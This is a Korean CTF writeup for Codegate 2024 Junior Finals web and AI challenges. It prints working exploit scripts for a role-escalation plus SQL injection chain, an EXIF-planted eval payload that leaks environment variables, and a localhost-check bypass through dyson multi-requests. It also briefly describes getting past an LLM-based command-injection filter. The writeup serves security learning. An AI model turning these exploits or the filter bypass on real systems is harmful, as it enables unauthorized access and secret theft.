---
title: Codegate 2024 Junior Finals Writeup
description: A writeup for Codegate 2024 Junior Finals (Web)
date: 2024-09-24
tags:
  - CTF
  - Writeup
  - Web
  - Ai
draft: false
---

## Web

### ShieldOSINT

총 3단계로 이루어진 문제이다. (플래그는 일반적으로는 접근 불가한 `SITE_SECRET` 테이블에 존재한다.)

1. 에러를 발생시켜 권한 상승
2. `session` 생성
3. `SQL Injection`으로 `flag` 획득

`Spring Boot`에서는 인증(로그인, 회원가입 등)이 성공하면, 하나의 핸들러를 거치게 된다.

```kotlin {26-28}
class ShieldCloud : AuthenticationSuccessHandler {

    override fun onAuthenticationSuccess(
        request: HttpServletRequest,
        response: HttpServletResponse,
        authentication: Authentication
    ) {
        val authorities: MutableList<GrantedAuthority> = authentication.authorities.toMutableList()
        val shieldParamdata = request.getParameter("ShieldParam")
        var user_role: String = "false"

        if (shieldParamdata != null) {
            try {
                val shieldParamNode: JsonNode = ObjectMapper().readTree(shieldParamdata)
                val shieldParam = shieldParamNode!!.get("user_role")
                println("shieldParam: ${shieldParam} type: ${shieldParam::class.simpleName}")

                user_role = shieldParam?.toString() ?: "false"

                if (user_role == "true") {
                    authorities.add(SimpleGrantedAuthority("ROLE_USER"))
                }

            } catch (e: JsonParseException) {
                authorities.add(SimpleGrantedAuthority("ROLE_USER"))
            } catch (e: Exception) {
                authorities.add(SimpleGrantedAuthority("ROLE_ADMIN"))
            }
        } else {
            authorities.add(SimpleGrantedAuthority("ROLE_USER"))
        }

        val newAuth = UsernamePasswordAuthenticationToken(
            authentication.principal,
            authentication.credentials,
            authorities
        )

        SecurityContextHolder.getContext().authentication = newAuth

        response.sendRedirect("/")
    }
}
```

위 코드를 보면, `shieldParam`이 `true`일 경우 `ROLE_USER`를 부여하고, `JsonParseException`을 제외한 `Exception`이 발생한 경우 `ROLE_ADMIN`을 부여한다. 즉, `ROLE_ADMIN`을 부여받기 위해서는 `NullPointerException`을 발생시켜야 한다. (필요한 키인 `user_role`이 없는 경우 `NullPointerException`이 발생한다.)

그러나, `ROLE_ADMIN`을 받기만 해서는 `flag`를 얻기 위한 어떠한 작업도 수행할 수 없다. 아래의 코드를 보면, `flag`를 얻을 수 있는 통로인 `/api/v6/shieldosint/search`에서 `session`이 없다면 `Session null`을 반환하기 때문이다.

```kotlin {29}
@RequestMapping("/api/v6/shieldosint")
@Controller
class ApiController(private val userService: UserService) {
    @EndPointManager
    @PreAuthorize("isAuthenticated()")
    @GetMapping("/search")
    @ResponseBody
    fun search(
        principal: Principal,
        @RequestParam("s", required = false, defaultValue = "testQuery") searchcheck: String = "",
        @RequestParam("q", required = false, defaultValue = "") querycheck: String = "",
        @RequestParam("mp", required = false, defaultValue = "") magiccheck: String = ""
    ): String {
        try {
            val siteUser = userService!!.getUser(principal.name)

            if (siteUser.session != "null") {
                val reflectionController = ReflectionController()

                val dataProvider = DataProvider()
                dataProvider.initializeDatabase()

                val methodName = searchcheck
                val defaultQueryResult = reflectionController.reflectMethod(methodName)

                val query = querycheck

                if (query.isNotEmpty()) {
                    val customQueryResult = reflectionController.reflectMethod(methodName, query, magiccheck)
                    return "Query Result: $customQueryResult"
                } else {
                    return "Query Result: $defaultQueryResult"
                }
            }
            else {
                return "session null ${siteUser.username}<br>${siteUser.session}"
            }

        } catch (e: Exception) {
            return "Error"
        }
    }

    @EndPointManager
    @PreAuthorize("isAuthenticated()")
    @GetMapping("/query")
    @ResponseBody
    fun query(
        principal: Principal,
        @RequestParam("q") sessioncheck: String
    ): String {
        try {
            if (sessioncheck != "Y") {
                return "Username: ${principal.name}<br>Session: null"
            }

            val requestAttributes = RequestContextHolder.getRequestAttributes() as ServletRequestAttributes
            val request: HttpServletRequest = requestAttributes.request

            val sessionId = request.session.id
            val siteUser = userService!!.getUser(principal.name)

            userService.sessionAdd(
                siteUser = siteUser, session = sessionId
            )

            return "Username: ${principal.name}<br>Session: ${siteUser.session}<br>Add Success!"
        } catch (e: Exception) {
            return "Error"
        }
    }
}
```

따라서, `session`을 생성하기 위해서 `/api/v6/shieldosint/query`에 `sessioncheck`를 `Y`로 보내면 된다.

그리고 나면, 최종 관문인 `/api/v6/shieldosint/search`에서 `SQL Injection`을 통해 `flag`를 획득할 수 있다. 아래의 코드를 보면 알겠지만, `/api/v6/shieldosint/search`에서 호출된 `ReflectionController`는 `DataProvider`의 메소드를 호출한다.

```kotlin
class ReflectionController {

    fun reflectMethod(
        methodName: String,
        query: String? = null,
        magicParam: Any? = null
    ): String {
        return try {
            val clazz = DataProvider::class
            val instance = clazz.createInstance()

            val method: KCallable<*>? = clazz.declaredFunctions.firstOrNull { it.name == methodName }

            if (method != null) {
                if (query != null && query.isNotEmpty()) {
                    when (magicParam) {
                        is String -> {
                            val finalQuery = query.split(" ")[2]
                            method.call(instance, finalQuery) as String
                        }
                        is Int -> {
                            val finalQuery = query.split(" ").last()
                            method.call(instance, finalQuery) as String
                        }
                        is Boolean -> {
                            val finalQuery = query.split(" ").first()
                            method.call(instance, finalQuery) as String
                        }
                        else -> method.call(instance, query) as String
                    }
                } else {
                    method.call(instance, "") as String
                }
            } else {
                "Method not found"
            }
        } catch (e: Exception) {
            "An error occurred: ${e.message}"
        }
    }
}
```

즉, `/api/v6/shieldosint/search` -> `ReflectionController` -> `DataProvider` 순으로 호출되는데, `ReflectionController`에서 `DataProvider`의 메소드를 호출할 때, `mp`와 `query`에 따라 전달되는 인자가 달라진다. `magicParam`는 `type`을 나타내고, `query`는 `magicParam`에 따른 데이터를 나타낸다. 즉, `magicParam`을 `string`으로 지정하여, `query`의 3번째 단어에 `SQL Injection`을 할 쿼리를 넣으면 된다.

```kotlin {2-10}
fun filterQuery(query: String): String {
        val hasWhitespace = Regex("\\s")
        val containsRuntime = Regex("(?i)runtime")
        val containsJava = Regex("(?i)java")
        val special_check1 = Regex("/")
        val special_check2 = Regex("\\*")
        val special_check3 = Regex("%")
        val special_check4 = Regex("(?i)DROP")
        val special_check5 = Regex("(?i)DELETE")
        val isLengthValid = query.length <= 40

        if (hasWhitespace.containsMatchIn(query) || containsRuntime.containsMatchIn(query) || containsJava.containsMatchIn(query) || special_check1.containsMatchIn(query) || special_check2.containsMatchIn(query) || special_check3.containsMatchIn(query) || special_check4.containsMatchIn(query) || special_check5.containsMatchIn(query) || !isLengthValid) {
            return ""
        }

        return query
    }

    fun selectQuery(query: String = ""): String {
        val selectSQL = "SELECT SUBJECT FROM QUESTION WHERE ID>=1 and ID<=10"

        val filteredQuery = filterQuery(query)
        val finalQuery = if (filteredQuery.isNotBlank()) "$selectSQL $filteredQuery" else selectSQL
        println("Executing SQL: $finalQuery")

        try {
            getConnection().use { connection ->
                connection.createStatement().use { statement ->
                    val resultSet = statement.executeQuery(finalQuery)
                    val results = StringBuilder()

                    while (resultSet.next()) {
                        results.append(resultSet.getString(1)).append("\n")
                    }

                    return results.toString().trim()
                }
            }
        } catch (e: SQLException) {
            e.printStackTrace()
        }
        return "fail"
    }
```

이제 여기서 위 코드의 `WAF`를 우회해야 하는데 간단히 우회할 수 있다. `UNION(SELECT(sdata)FROM(SITE_SECRET))`를 사용하면 된다!

최종적인 익스 코드는 아래와 같다.

```typescript
import axios from 'axios'
import { stringify, parse } from 'qs'

const instance = axios.create({
  baseURL: 'http://13.125.48.233:8780',
})

const csrfTokenRes = await instance.get('/user/login')
const csrfToken = csrfTokenRes.data.match(/value="(.+)"/)[1]
let TOKEN = csrfTokenRes.headers['set-cookie']?.[0].split(';')[0]
const loginRes = await instance.post(
  '/user/login?ShieldParam=%7B%22userasdf_role%22%3Anull%7D',
  stringify({
    username: 'asdfasdfasdf12',
    password: 'asdfasdfasdf12',
    _csrf: csrfToken,
  }),
  {
    maxRedirects: 0,
    headers: {
      cookie: TOKEN,
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    validateStatus: (status) => status === 302,
  },
)

TOKEN = loginRes.headers['set-cookie']?.[0].split(';')[0]

await instance.get('/api/v6/shieldosint/query', {
  params: { q: 'Y' },
  headers: { cookie: TOKEN },
})

const sql = `UNION(SELECT(sdata)FROM(SITE_SECRET))`
console.info(sql.length)
await instance
  .get('/api/v6/shieldosint/search', {
    params: { s: 'filterQuery', q: `a a ${sql}`, mp: 'string' },
    headers: { cookie: TOKEN },
  })
  .then((v) => console.log(v.data.replace('Query Result: ', '').length))
await instance
  .get('/api/v6/shieldosint/search', {
    params: { s: 'selectQuery', q: `a a ${sql}`, mp: 'string' },
    headers: { cookie: TOKEN },
  })
  .then((v) => console.log(v.data.replace('Query Result: ', '')))
```

~~플래그를 안 적어뒀다 ㅠㅠ~~

### combination

`docker-compose.yml`을 보면, `flag`가 `environment`에 저장되어 있는 것을 확인할 수 있다. 또 `app.py`를 보면 누가 봐도 의심스러운 `safe_eval` 함수가 존재한다. 또한 이는 `/verify`에서 특정 조건을 만족하면 호출된다. 그렇다면 `safe_eval` 함수를 통해 `os.environ`을 호출하여 `flag`를 획득하면 된다.

```python {30-33, 57}
@app.route('/verify', methods=['GET', 'TRACE'])
def verify_file():
    flag = 0

    if request.method == 'GET':
        new_file_path = session.get('new_file_path')
        if not new_file_path:
            return jsonify({'error': 'No file to verify'}), 400
        else:
            return jsonify({'error': 'Verified'}), 200


    if request.method == 'TRACE':
        new_file_path = session.get('new_file_path')
        try:
            img = Image.open(new_file_path)
            file_ext = os.path.splitext(new_file_path)[1].lower()

            if file_ext in ['.png']:
                metadata = img.text
                return jsonify({'success': "Verified"}), 200
            elif file_ext in ['.jpg', '.jpeg']:
                img = Image.open(new_file_path)
                try:
                    if 'exif' in img.info:
                        exif_data = img.info['exif']
                        if b"CODEGATE2024\x00" not in exif_data:
                            return  jsonify({'error': 'Unsupported file parse'}), 400

                        json_start_marker = b"CODEGATE2024\x00"
                        json_start_index = exif_data.find(json_start_marker) + len(json_start_marker)
                        json_data_bytes = exif_data[json_start_index:]
                        json_data_str = json_data_bytes.decode('ascii')

                        try:
                            json_data = json.loads(json_data_str)
                        except json.JSONDecodeError:
                            json_data = None
                            return jsonify({'success': "Verified"}), 200

                except KeyError as e:
                    print('Index is not included')

                try:
                    exif_data = img._getexif()
                    if exif_data:
                        exif = {ExifTags.TAGS.get(tag, tag): value for tag, value in exif_data.items()}
                        for key, value in exif.items():
                            if "ImageDescription" in key:
                                ret = validate_domain(value) or validate_ipv4(value) or validate_ipv6(value)
                                if not ret:
                                    return jsonify({'success': 'Verified'})
                                if "(" in value:
                                    return jsonify({'success': 'Verified'})
                                if ")" in value:
                                    return jsonify({'success': 'Verified'})
                                description_contents = safe_eval(value)
                                items_dict = dict(description_contents)
                                return jsonify({'debug': f'{items_dict}' })
                except Exception as e:
                    print(e)
            else:
                return jsonify({'error': 'Unsupported file format'}), 400

            if flag == 1:
                return jsonify({'success': "This is an image"}), 200
            else:
                return jsonify({'success': "Verified"}), 200

        except Exception as e:
            return jsonify({'error': 'Error processing image'}), 500
```

위 코드를 보면 알겠지만, `/verify`의 조건을 만족시키기 위해서는 두 개의 이미지가 필요하며 `EXIF`에 `CODEGATE2024\x00`가 존재해야 한다. 그리고 `ImageDescription`에 `os.environ`을 호출하는 코드가 존재해야 한다.

따라서 아래의 코드를 통해 `flag`를 획득할 수 있다. ~~파이썬 너무 어려워요~~

```python
import piexif
import requests

from PIL import Image

cmd  = 'os.environ'

exif_dict = {
    "0th": {
        piexif.ImageIFD.ImageDescription: cmd
    },
    "Exif": {
        piexif.ExifIFD.UserComment: b"CODEGATE2024\x00"  + '{"key": "value"}'.encode('ascii'),
    }
}

exif_bytes = piexif.dump(exif_dict)

width, height = 10, 10

img1 = Image.new('RGB', (width, height),  (255, 255, 255))
img2 = Image.new('RGB', (width, height), (255, 245, 255))


img1.save('img1.jpeg', exif=exif_bytes)
img2.save('img2.jpeg', exif=exif_bytes)


r = requests.Session()

with open('img1.jpeg', 'rb') as file_a, open('img2.jpeg', 'rb') as file_b:
    files = {
        'file-a': file_a,
        'file-b': file_b
    }
    a = r.post('http://43.201.116.50:3456/upload', files=files)
    print(a.text)
    b = r.request('TRACE','http://43.201.116.50:3456/verify')
    print(b.text)
```

~~또 플래그를 안 적어뒀다 ㅠㅠㅠㅠ~~

### dyson

대회 당일날 6시간가량 이 문제 잡다가 [ShieldOSINT](#shieldosint)와 [combination](#combination)를 잡았는데, 방향을 잘 잡았으면 풀지 않았을까 한다.

먼저 `secret.js`를 봐보자.

<!-- prettier-ignore-start -->
```js
var g = require('dyson-generators');
var realFlag = require('fs').readFileSync('/flag.txt').toString();

module.exports = {
	path: '/api/flagService',
	exposeRequest: true,
	cache: false,
	template: {
		flag: function (req) {
			let guessPassword = false,
				guessFlag = false;
			try {
				if (
					req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1' &&
					req.socket.remoteAddress.replace(/^.*:/, '') != '1.3.3.7'
				) {
					return 'Try Again!!';
				}

				if (
					req.query.guess !== undefined &&
					typeof req.query.guess !== 'string' &&
					req.query.guess.length > 3
				) {
					return 'Try Again!!';
				}
				const SuperSecretPassword = '[REDACTED]'
                [guessPassword, guessFlag] =
					req.query.guess !== undefined ? atob(req.query.guess).split('|') : ['idk', 'idk'])
				if (SuperSecretPassword == guessPassword) {
					return realFlag;
				} else if (realFlag == guessFlag) {
					return realFlag;
				} else {
					return 'Try Again!!';
				}
			} catch {
				return 'Try Again!!';
			}
		},
		status: 'OK'
	}
};
```
<!-- prettier-ignore-end -->

`/api/flagService`로 요청을 받으며, `localhost`이면서 `SuperSecretPassword`와 `guessPassword`가 같거나, `realFlag`와 `guessFlag`가 같으면 `flag`를 반환한다. 그러나 이는 일반적으로는 우회가 불가능하다. `SuperSecretPassword`는 풀이자가 알 수 없도록 길 것이며, `realFlag`는 `sha256`으로 해싱되어 있을 거기 때문이다.

일단 다른 정보들도 얻어보자. 먼저, `Dockerfile`을 보면 [dyson-demo](https://github.com/webpro/dyson-demo)를 가져오는 것을 알 수 있다. 이는 `dyson`을 활용한 앱임을 알 수 있으며, `dyson`은 `multi request`를 지원하는 라이브러리이다.

```js
const http = require('http')

const isMultiRequest = (path, options) => {
  const delimiter = options.multiRequest
  return delimiter
    ? path.split('/').find((fragment) => fragment.includes(delimiter))
    : false
}

const doMultiRequest = (req, path) => {
  const options = req.app.get('dyson_options')
  const { err } = req.app.get('dyson_logger')
  const [hostname, port] = req.headers.host.split(':')
  const delimiter = options.multiRequest
  const range = isMultiRequest(path, options)

  return range.split(delimiter).map((id, index, list) => {
    const url = path.replace(list, id)
    let data = ''

    return new Promise((resolve, reject) => {
      http
        .get({ hostname, port, path: url }, (res) => {
          res.on('data', (chunk) => {
            data += chunk
          })
          res.on('end', () => {
            resolve(JSON.parse(data))
          })
        })
        .on('error', (error) => {
          err(error.message)
          reject(error)
        })
    })
  })
}

module.exports = {
  isMultiRequest,
  doMultiRequest,
}
```

이를 통해서 일단, `localhost` 필터링을 우회할 수 있다.

`secret.js`를 좀 자세히 보면, `;(semicolon)`이 안 찍혀 있는 것을 알 수 있다.

<!-- prettier-ignore-start -->
```js
const SuperSecretPassword = '[REDACTED]'
[guessPassword, guessFlag] =
	req.query.guess !== undefined ? atob(req.query.guess).split('|') : ['idk', 'idk'])
```
<!-- prettier-ignore-end -->

와

```js
const SuperSecretPassword =
  /*"[REDACTED]" [guessPassword, guessFlag] =*/ req.query.guess !== undefined
    ? atob(req.query.guess).split('|')
    : ['idk', 'idk']
```

는 `ASI misbehavior`로 인해, 같은 코드로 인식된다. 따라서, `http://url:port/user?,api/flagService?guess=`으로 요청을 하면 `flag`를 얻을 수 있다. (물론 아래 사진과 같이, `host`를 변경해야 한다.)

![dyson1](dyson1.png)

대회 때 `multi request`가 있는 것은 알았으나, `ASI misbehavior`를 이용한 우회는 생각하지 못했다. 그래서 `npm audit` 돌려서 나온, `prototype pollution`만 엄청 시도해보고 있었다.

## Ai

### firewall

문제 파일을 보게 되면, `ai`를 통해 `cmd injection`을 방지하려고 하는 것을 알 수 있다. 그러나, `cmd injection` 필터링 명령을 `system` 프롬프트가 아닌 `user` 프롬프트를 통해 하기 때문에, 비교적 쉽게 우회할 수 있다.

![firewall1](firewall1.png)

`codegate2024{1786d016ae1230e8d03e76c53c4a622098c72b73573d68979e167b45524407ed5c131c002342f44f664674fe91f2655a7a28}`

다른 문제들은 풀면 업데이트하겠다.
